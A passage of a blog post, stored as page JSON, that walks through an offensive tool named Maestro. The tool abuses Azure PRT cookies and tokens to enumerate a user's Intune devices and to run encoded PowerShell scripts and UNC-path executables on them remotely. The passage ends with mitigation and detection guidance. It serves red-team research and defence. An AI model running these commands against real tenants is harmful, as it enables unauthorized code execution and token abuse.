Users","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":22,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_45":{"__typename":"Paragraph","id":"45f5bfae1934_45","name":"0e5e","type":"P","href":null,"layout":null,"metadata":null,"text":"First, we’ll get a list of Intune devices where cthompson is the primary user, including what users were logged on the last time the device checked in. When the -d option is set, Maestro searches the specified database file for a valid access token with the required scope, then refresh tokens, and finally PRTs before getting a nonce from Azure and fetching a PRT cookie signed by the local system’s TPM to authenticate subsequent requests.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":48,"end":57,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":161,"end":163,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_46":{"__typename":"Paragraph","id":"45f5bfae1934_46","name":"d0d4","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d \u003Cname\u003E.db get intune devices -f \"userPrincipalName eq '\u003Cuser\u003E@\u003Ctenant\u003E.onmicrosoft.com'\" -p usersLoggedOn","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*FAVqFEp0jeWwTJo2":{"__typename":"ImageMetadata","id":"0*FAVqFEp0jeWwTJo2","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_47":{"__typename":"Paragraph","id":"45f5bfae1934_47","name":"abcf","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*FAVqFEp0jeWwTJo2"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_48":{"__typename":"Paragraph","id":"45f5bfae1934_48","name":"7dab","type":"P","href":null,"layout":null,"metadata":null,"text":"Next, Maestro uses the PRT cookie to request a code and id_token from Azure, uses them to obtain a portalAuthorization blob containing a refresh token from the authorize endpoint, and uses the refresh token to obtain an access token for Intune device management from the DelegationToken endpoint.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":47,"end":51,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":56,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":99,"end":118,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":160,"end":169,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":271,"end":286,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*hIpxcicOVIE7iNk7":{"__typename":"ImageMetadata","id":"0*hIpxcicOVIE7iNk7","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_49":{"__typename":"Paragraph","id":"45f5bfae1934_49","name":"7954","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*hIpxcicOVIE7iNk7"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_50":{"__typename":"Paragraph","id":"45f5bfae1934_50","name":"c025","type":"P","href":null,"layout":null,"metadata":null,"text":"Then Maestro uses the access token to obtain the list of Intune devices where cthompson is the primary user, including their device IDs and the IDs of users logged on.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":78,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*OJQFwAqHRJSVbPxj":{"__typename":"ImageMetadata","id":"0*OJQFwAqHRJSVbPxj","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_51":{"__typename":"Paragraph","id":"45f5bfae1934_51","name":"748e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*OJQFwAqHRJSVbPxj"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_52":{"__typename":"Paragraph","id":"45f5bfae1934_52","name":"0841","type":"P","href":null,"layout":null,"metadata":null,"text":"If we execute the same command again, Maestro will reuse the access token rather than going through the entire authentication flow again.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*NSCuqPumC9AJ6nmS":{"__typename":"ImageMetadata","id":"0*NSCuqPumC9AJ6nmS","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_53":{"__typename":"Paragraph","id":"45f5bfae1934_53","name":"c65d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*NSCuqPumC9AJ6nmS"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_54":{"__typename":"Paragraph","id":"45f5bfae1934_54","name":"bb31","type":"P","href":null,"layout":null,"metadata":null,"text":"Next, we’ll resolve the user ID bfb6a9c2-f3c8–4b9c-9d09–2924d38895f7 from the output of the previous command to a principal name, noting that it was cthompson with domain SID S-1–12–1–3216419266–1268577224–606669213–4153772243 who was logged into the Intune device with ID e537180b-6d04–427e-bf93-dbde818400eb the last time it checked in.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":32,"end":68,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":149,"end":158,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":175,"end":226,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":273,"end":309,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_55":{"__typename":"Paragraph","id":"45f5bfae1934_55","name":"a292","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d Maestro.db get entra users -i \u003Cid\u003E --reauth","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":60,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*Fl9g9KN7xic9CtnY":{"__typename":"ImageMetadata","id":"0*Fl9g9KN7xic9CtnY","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_56":{"__typename":"Paragraph","id":"45f5bfae1934_56","name":"48ff","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*Fl9g9KN7xic9CtnY"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_57":{"__typename":"Paragraph","id":"45f5bfae1934_57","name":"ef2e","type":"P","href":null,"layout":null,"metadata":null,"text":"Device Query","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_58":{"__typename":"Paragraph","id":"45f5bfae1934_58","name":"d656","type":"P","href":null,"layout":null,"metadata":null,"text":"We’ll make sure that the user is still logged in right now using device query, which, similar to SCCM’s CMPivot feature, allows real-time read access to Intune enrolled devices. To do that, we’ll query the Windows Registry HKEY_USERS hive, which indicates that our target user’s domain SID has a session on the device right now.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":223,"end":233,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":104,"end":111,"href":"https:\u002F\u002Flearn.microsoft.com\u002Fen-us\u002Fmem\u002Fconfigmgr\u002Fcore\u002Fservers\u002Fmanage\u002Fcmpivot-overview","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_59":{"__typename":"Paragraph","id":"45f5bfae1934_59","name":"ba92","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d \u003Cname\u003E.db exec intune device-query -i \u003Cdevice_id\u003E -q 'WindowsRegistry(\"\"\"HKU\\*\"\"\"')","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":1,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*KcALG9sKoIrYdg9r":{"__typename":"ImageMetadata","id":"0*KcALG9sKoIrYdg9r","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_60":{"__typename":"Paragraph","id":"45f5bfae1934_60","name":"2d4f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*KcALG9sKoIrYdg9r"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_61":{"__typename":"Paragraph","id":"45f5bfae1934_61","name":"5d18","type":"P","href":null,"layout":null,"metadata":null,"text":"Script Execution","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_62":{"__typename":"Paragraph","id":"45f5bfae1934_62","name":"9e79","type":"P","href":null,"layout":null,"metadata":null,"text":"On another device, we’ll use PowerShell to encode a script we’d like to execute on the Intune device. We’ll just write a new file to the C drive for the purpose of this demonstration, but the world is your oyster here.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_63":{"__typename":"Paragraph","id":"45f5bfae1934_63","name":"53cd","type":"PRE","href":null,"layout":null,"metadata":null,"text":"# Execute a script on the system\n$timestamp = Get-Date -Format \"yyyyMMdd_HHmmss\";\n$script = \"New-Item -Path 'C:\\' -Name \"\"Maestro_Executed_$timestamp.txt\"\" -ItemType \"\"File\"\"\";\n$bytes = [System.Text.Encoding]::UTF8.GetBytes($script);\n$encoded = [Convert]::ToBase64String($bytes);\nWrite-Output $encoded","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_64":{"__typename":"Paragraph","id":"45f5bfae1934_64","name":"10dc","type":"P","href":null,"layout":null,"metadata":null,"text":"Finally, we’ll execute the script on the target device then periodically check whether the script has executed and whether the first line of output is available, which is all that is made available by MS Graph. This can take a REALLY long time, especially after running multiple Intune scripts in a short time, but you can use the -t 0 option if you want to wait as long as it takes to recover the script’s output.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":331,"end":335,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_65":{"__typename":"Paragraph","id":"45f5bfae1934_65","name":"2cb7","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d \u003Cname\u003E.db exec intune script -i \u003Cdevice_id\u003E -s \u003Cbase64_encoded_script\u003E -n \u003Cscript_name\u003E -t 0","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":109,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*NAmdfkv9smDPf4hk":{"__typename":"ImageMetadata","id":"0*NAmdfkv9smDPf4hk","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_66":{"__typename":"Paragraph","id":"45f5bfae1934_66","name":"d84d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*NAmdfkv9smDPf4hk"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*Bgkm4Mv2aqqLzDda":{"__typename":"ImageMetadata","id":"0*Bgkm4Mv2aqqLzDda","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_67":{"__typename":"Paragraph","id":"45f5bfae1934_67","name":"e5d1","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*Bgkm4Mv2aqqLzDda"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_68":{"__typename":"Paragraph","id":"45f5bfae1934_68","name":"50dd","type":"P","href":null,"layout":null,"metadata":null,"text":"If you don’t want to hang your C2 agent or if your access token expires before the script output is available, you can request output manually as well.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_69":{"__typename":"Paragraph","id":"45f5bfae1934_69","name":"58e1","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d \u003Cname\u003E.db get intune script-output -i \u003Cscript_id\u003E — device \u003Cdevice_id\u003E","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*xUkzQswxjW3Ha9lx":{"__typename":"ImageMetadata","id":"0*xUkzQswxjW3Ha9lx","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_70":{"__typename":"Paragraph","id":"45f5bfae1934_70","name":"ff96","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*xUkzQswxjW3Ha9lx"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_71":{"__typename":"Paragraph","id":"45f5bfae1934_71","name":"feff","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately, at the time of this writing, there is no FileContent device query action, so we can’t read the full contents of arbitrary files from remote devices with device query yet. You’ll have to get creative with script\u002Fapplication execution to accomplish that.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":56,"end":67,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_72":{"__typename":"Paragraph","id":"45f5bfae1934_72","name":"d4b3","type":"P","href":null,"layout":null,"metadata":null,"text":"Application Execution","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_73":{"__typename":"Paragraph","id":"45f5bfae1934_73","name":"4af3","type":"P","href":null,"layout":null,"metadata":null,"text":"To execute an arbitrary application on an Intune device, simply point Maestro to the UNC path of the executable and either specify an Intune device ID, Entra device ID, or the ID of an existing Entra group containing the ID of the machine to execute the app on. If a device ID is specified, Maestro will automatically locate the device in both Intune and Entra and add it to a new Entra group before executing the application.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_74":{"__typename":"Paragraph","id":"45f5bfae1934_74","name":"6c76","type":"P","href":null,"layout":null,"metadata":null,"text":".\\Maestro.exe -d \u003Cname\u003E.db exec intune app -p \u003Cunc_path\u003E -i \u003Cdevice_id\u003E","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":71,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*3XtJlSpoVDpVxMJT":{"__typename":"ImageMetadata","id":"0*3XtJlSpoVDpVxMJT","originalHeight":874,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_75":{"__typename":"Paragraph","id":"45f5bfae1934_75","name":"ff32","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*3XtJlSpoVDpVxMJT"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_76":{"__typename":"Paragraph","id":"45f5bfae1934_76","name":"8c16","type":"P","href":null,"layout":null,"metadata":null,"text":"Maestro will attempt to force the device to sync with Intune to fetch applications pending installation via its persistent notification channel, but this fails pretty often because Microsoft severely throttles the number of sync actions a device can make in a short amount of time. In this case, you can use the exec intune sync command to try again or wait until the device’s next naturally occurring check-in (every eight hours or after rebooting by default).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":312,"end":328,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*S3BJe3X0QlUJlkGB":{"__typename":"ImageMetadata","id":"0*S3BJe3X0QlUJlkGB","originalHeight":695,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_77":{"__typename":"Paragraph","id":"45f5bfae1934_77","name":"8892","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*S3BJe3X0QlUJlkGB"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_78":{"__typename":"Paragraph","id":"45f5bfae1934_78","name":"ef24","type":"P","href":null,"layout":null,"metadata":null,"text":"Maestro does not clean up the new app and Entra group automatically because of this uncertain execution window, but the commands needed to execute cleanup manually are displayed to the user.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_79":{"__typename":"Paragraph","id":"45f5bfae1934_79","name":"6603","type":"P","href":null,"layout":null,"metadata":null,"text":"Eventually (the only unit of time Intune supports 🥲), you should see the results of your application execution.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_80":{"__typename":"Paragraph","id":"45f5bfae1934_80","name":"4289","type":"H3","href":null,"layout":null,"metadata":null,"text":"Using the Database","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_81":{"__typename":"Paragraph","id":"45f5bfae1934_81","name":"a6ba","type":"P","href":null,"layout":null,"metadata":null,"text":"Right now, the best way to review the contents of the database file is by opening it in LiteDB, where you can review previously queried objects and credentials obtained from Azure.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*fJnwZqp3rxDjZygt":{"__typename":"ImageMetadata","id":"0*fJnwZqp3rxDjZygt","originalHeight":796,"originalWidth":1600,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_82":{"__typename":"Paragraph","id":"45f5bfae1934_82","name":"c832","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*fJnwZqp3rxDjZygt"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_83":{"__typename":"Paragraph","id":"45f5bfae1934_83","name":"b72a","type":"H3","href":null,"layout":null,"metadata":null,"text":"What’s next for Maestro?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_84":{"__typename":"Paragraph","id":"45f5bfae1934_84","name":"893e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"More flexible token manipulation and storage","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_85":{"__typename":"Paragraph","id":"45f5bfae1934_85","name":"1217","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Additional methods of execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_86":{"__typename":"Paragraph","id":"45f5bfae1934_86","name":"6141","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Credential gathering via Intune (Cloud LAPS)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_87":{"__typename":"Paragraph","id":"45f5bfae1934_87","name":"bc7b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Azure Arc support","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_88":{"__typename":"Paragraph","id":"45f5bfae1934_88","name":"6932","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Command line options for items in the database","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_89":{"__typename":"Paragraph","id":"45f5bfae1934_89","name":"2e82","type":"ULI","href":null,"layout":null,"metadata":null,"text":"More enumeration techniques with Entra and Resource Graph","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_90":{"__typename":"Paragraph","id":"45f5bfae1934_90","name":"66a5","type":"H3","href":null,"layout":null,"metadata":null,"text":"Defensive Guidance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_91":{"__typename":"Paragraph","id":"45f5bfae1934_91","name":"9569","type":"H4","href":null,"layout":null,"metadata":null,"text":"Mitigation","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":10,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_92":{"__typename":"Paragraph","id":"45f5bfae1934_92","name":"21e8","type":"P","href":null,"layout":null,"metadata":null,"text":"If conditional access policies or security defaults require MFA for access to Azure admin portals and other applications that allow execution of administrative actions using Microsoft Graph, and the administrator is not logged into the device with Windows Hello for Business, MFA will prevent this particular attack because the PRT for that device\u002Fuser combo will not have an MFA claim to satisfy the policy.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_93":{"__typename":"Paragraph","id":"45f5bfae1934_93","name":"fae6","type":"H4","href":null,"layout":null,"metadata":null,"text":"Detection","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_94":{"__typename":"Paragraph","id":"45f5bfae1934_94","name":"dd4d","type":"P","href":null,"layout":null,"metadata":null,"text":"Brett Hawkins at IBM X-Force Red recently wrote an excellent, very detailed blog post about detecting Intune lateral movement techniques and provided Sentinel-ready KQL queries that can be used to alert upon suspicious Intune script and application execution. There are lots of events of interest generated from this attack path that the KQL queries can be modified to support.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":13,"href":"https:\u002F\u002Fx.com\u002Fh4wkst3r\u002Fstatus\u002F1831366969079296097","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":76,"end":136,"href":"https:\u002F\u002Fsecurityintelligence.com\u002Fx-force\u002Fdetecting-intune-lateral-movement\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":150,"end":176,"href":"https:\u002F\u002Fgithub.com\u002Fh4wkst3r\u002FKQL-Queries\u002Ftree\u002Fmain\u002FMicrosoftIntune","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*r0y6mGyl4690yHAG":{"__typename":"ImageMetadata","id":"0*r0y6mGyl4690yHAG","originalHeight":525,"originalWidth":1396,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:45f5bfae1934_95":{"__typename":"Paragraph","id":"45f5bfae1934_95","name":"8dbc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*r0y6mGyl4690yHAG"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_96":{"__typename":"Paragraph","id":"45f5bfae1934_96","name":"2239","type":"P","href":null,"layout":null,"metadata":null,"text":"When creating detections, keep in mind that the attacker can control the information that Maestro and similar tools send to Microsoft Graph in HTTP requests (e.g., User Agent, time between requests, etc.). If possible, baseline your Intune admins’ legitimate activities and alert upon suspicious usage of these features. For example, if Intune apps are deleted very rarely in your organization or are typically created several days before they are assigned, those events might be indicators of compromise.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_97":{"__typename":"Paragraph","id":"45f5bfae1934_97","name":"4405","type":"H3","href":null,"layout":null,"metadata":null,"text":"Have questions or want to collaborate on new functionality or research?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:45f5bfae1934_98":{"__typename":"Paragraph","id":"45f5bfae1934_98","name":"0ab6","type":"P","href":null,"layout":null,"metadata":null,"text":"Hit me up on Twitter (@_Mayyhem) or in the BloodHound Slack!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":22,"end":31,"href":"https:\u002F\u002Fx.com\u002F_Mayyhem","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":43,"end":59,"href":"https:\u002F\u002Fghst.ly\u002FBHSlack","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"CollectionViewerEdge:collectionId:f05f8696e3cc-viewerId:lo_7f2bf6c42a29":{"__typename":"CollectionViewerEdge","id":"collectionId:f05f8696e3cc-viewerId:lo_7f2bf6c42a29","isEditor":false,"isMuting":false},"ImageMetadata:1*s-5BWBr8XsgtIU5azKNhZQ.jpeg":{"__typename":"ImageMetadata","id":"1*s-5BWBr8XsgtIU5azKNhZQ.jpeg","originalWidth":2000,"originalHeight":805},"PostViewerEdge:postId:9ed71d38d546-viewerId:lo_7f2bf6c42a29":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:9ed71d38d546-viewerId:lo_7f2bf6c42a29"},"Post:9ed71d38d546":{"__typename":"Post","id":"9ed71d38d546","collection":{"__ref":"Collection:f05f8696e3cc"},"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"9492","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:45f5bfae1934_0"},{"__ref":"Paragraph:45f5bfae1934_1"},{"__ref":"Paragraph:45f5bfae1934_2"},{"__ref":"Paragraph:45f5bfae1934_3"},{"__ref":"Paragraph:45f5bfae1934_4"},{"__ref":"Paragraph:45f5bfae1934_5"},{"__ref":"Paragraph:45f5bfae1934_6"},{"__ref":"Paragraph:45f5bfae1934_7"},{"__ref":"Paragraph:45f5bfae1934_8"},{"__ref":"Paragraph:45f5bfae1934_9"},{"__ref":"Paragraph:45f5bfae1934_10"},{"__ref":"Paragraph:45f5bfae1934_11"},{"__ref":"Paragraph:45f5bfae1934_12"},{"__ref":"Paragraph:45f5bfae1934_13"},{"__ref":"Paragraph:45f5bfae1934_14"},{"__ref":"Paragraph:45f5bfae1934_15"},{"__ref":"Par